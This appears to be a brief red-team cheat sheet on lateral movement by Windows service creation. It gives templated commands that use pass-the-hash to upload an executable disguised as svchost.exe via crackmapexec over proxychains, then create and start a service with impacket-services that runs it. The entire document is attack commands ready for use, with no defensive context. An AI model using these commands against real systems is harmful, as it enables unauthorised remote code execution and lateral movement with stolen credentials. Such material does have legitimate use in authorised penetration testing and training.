# Service Creation
- **Requires Valid User Hash**

## impacket-services

##### Transfer payload to target
```bash
proxychains crackmapexec smb [IP] -u [USER] -d [DOMAIN] -H aad3b435b51404eeaad3b435b51404ee:[HASH] --put-file '[PATH\TO\FILE.exe]' '\\windows\\temp\\svchost.exe'
```

##### Create the service
```bash
proxychains impacket-services [DOMAIN]/[USER]@[IP] -hashes aad3b435b51404eeaad3b435b51404ee:[HASH] create -name "[Service Name]" -display "[SHORT_NAME]" -path "c:\\windows\\system32\\cmd.exe /c c:\\windows\\temp\\svchost.exe"
```

##### Start the service
```bash
proxychains impacket-services [DOMAIN]/[USER]@[IP] -hashes aad3b435b51404eeaad3b435b51404ee:[HASH] start -name "Service Name"
```
